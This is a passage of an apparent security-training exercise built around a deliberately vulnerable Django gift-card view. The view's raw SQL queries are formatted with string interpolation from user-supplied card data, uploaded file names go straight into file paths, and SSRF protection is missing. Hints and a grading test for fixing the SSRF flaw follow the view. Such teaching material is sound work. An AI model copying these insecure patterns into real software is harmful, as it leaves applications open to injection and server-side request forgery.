                    # check if we know about card.
                    print(card_data.strip())
                    signature = json.loads(card_data)['records'][0]['signature']
                    # signatures should be pretty unique, right?
                    card_query = Card.objects.raw(
                        'select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                    user_cards = Card.objects.raw(
                        'select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(
                            request.user.id))
                    card_query_string = ""
                    print("Found %s cards" % len(card_query))
                    for thing in card_query:
                        # print cards as strings
                        card_query_string += str(thing) + '\n'
                    if len(card_query) == 0:
                        # card not known, add it.
                        if card_fname is not None:
                            card_file_path = os.path.join(tempfile.gettempdir(),
                                                          f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        else:
                            card_file_path = os.path.join(tempfile.gettempdir(),
                                                          f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        fp = open(card_file_path, 'wb')
                        fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
                        fp.close()
                        card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                    else:
                        context['card_found'] = card_query_string
                        try:
                            card = Card.objects.get(data=card_data)
                            card.used = True
                            card.save()
                        except ObjectDoesNotExist:
                            print("No card found with data =", card_data)
                            card = None
                    context['card'] = card
                    return render(request, "use-card.html", context)
                except Exception as e:
                    return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")

            elif request.method == "POST" and request.POST.get('card_supplied', False):
                # Post with specific card, use this card.
                context['card_list'] = None
                # Need to write this to parse card type.
                card_file_data = request.FILES['card_data']
                card_fname = request.POST.get('card_fname', None)
                if card_fname is None or card_fname == '':
                    card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_parser.gftcrd')
                else:
                    card_file_path = os.path.join(tempfile.gettempdir(),
                                                  f'{card_fname}_{request.user.id}_parser.gftcrd')
                card_data = extras.parse_card_data(card_file_data.read(), card_file_path)
                # check if we know about card.
                print(card_data.strip())
                signature = json.loads(card_data)['records'][0]['signature']
                # signatures should be pretty unique, right?
                card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                user_cards = Card.objects.raw(
                    'select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(
                        request.user.id))
                card_query_string = ""
                print("Found %s cards" % len(card_query))
                for thing in card_query:
                    # print cards as strings
                    card_query_string += str(thing) + '\n'
                if len(card_query) == 0:
                    # card not known, add it.
                    if card_fname is not None:
                        card_file_path = os.path.join(tempfile.gettempdir(),
                                                      f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(),
                                                      f'newcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    fp = open(card_file_path, 'wb')
                    fp.write(card_data)
                    fp.close()
                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                else:
                    context['card_found'] = card_query_string
                    try:
                        card = Card.objects.get(data=card_data)
                        card.used = True
                        card.save()
                    except ObjectDoesNotExist:
                        print("No card found with data =", card_data)
                        card = None
                context['card'] = card
                return render(request, "use-card.html", context)
            elif request.method == "POST":
                card = Card.objects.get(id=request.POST.get('card_id', None))
                card.used = True
                card.save()
                context['card'] = card
                try:
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                return render(request, "use-card.html", context)
            return HttpResponse("Error 404: Internal Server Error")

        # TODO: Implement URL validation and SSRF protection
        # - Parse and validate user-provided URLs before making requests
        # - Restrict allowed protocols and domains (whitelist approach)
        # - Block access to internal/private network addresses
        # - Validate URL path formats for expected patterns
        return use_card_view


"""
<details>
<summary>Hints</summary>

1. Parse URLs using `urllib.parse.urlparse()`
2. Only allow HTTPS protocol
3. Whitelist specific domains (e.g., only pastebin.com)
4. Validate URL path formats
5. Block localhost and private IP ranges

</details>
"""


def test_fix_ssrf_vulnerability(exploit_ssrf_vulnerability):
    """Test that SSRF vulnerability has been fixed"""
    import importlib
    from LegacySite import views
    importlib.reload(views)

    views_file = "LegacySite/views.py"
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'

    try:
        # Step 1: Ensure database permissions are correct
        connection.close()

        # Ensure database file has write permissions
        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")

        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        # Backup the database before running test
        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        # Load test data to ensure database is properly initialized
        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")

        # Step 2: Read the original views.py content
        if not os.path.exists(views_file):
            print(f"⚠ Warning: {views_file} not found, cannot test fix")
            return False

        with open(views_file, 'r') as f:
            original_content = f.read()

        # Step 4: Run the exploit test to verify the fix works
        print("✓ Running exploit test against fixed code...")
        exploit_result = test_exploit_ssrf_vulnerability(exploit_ssrf_vulnerability)

        if not exploit_result:
            print("✓ SSRF exploit FAILED against fixed code - fix is working!")
            print("✓ The fixed version successfully prevents SSRF attacks")
            result = True
        else:
            print("⚠ SSRF exploit still succeeded - fix may need improvement")
            result = False

        print("✓ SSRF vulnerability fix test completed!")
        return result

    except Exception as e:
        print(f"Error during SSRF fix test: {e}")
        return False

    finally:
        # Step 5: Always restore the original views.py file if we added the import
        if 'has_import' in locals() and not has_import:
            try:
                with open(views_file, 'w') as f:
                    f.write(original_content)
                print(f"✓ Restored original {views_file} (removed security fix import)")
            except Exception as e:
                print(f"⚠ Warning: Could not restore original views.py: {e}")

        # Always restore the original database
        if os.path.exists(backup_path):
            try:
                shutil.move(backup_path, db_path)
                print(f"✓ Database restored from backup")
            except Exception as e:
                print(f"⚠ Warning: Could not restore database: {e}")

    print("=" * 60)


if __name__ == '__main__':
    print("\nTesting SSRF vulnerability fix...")
    test_fix_ssrf_vulnerability(exploit_ssrf_vulnerability)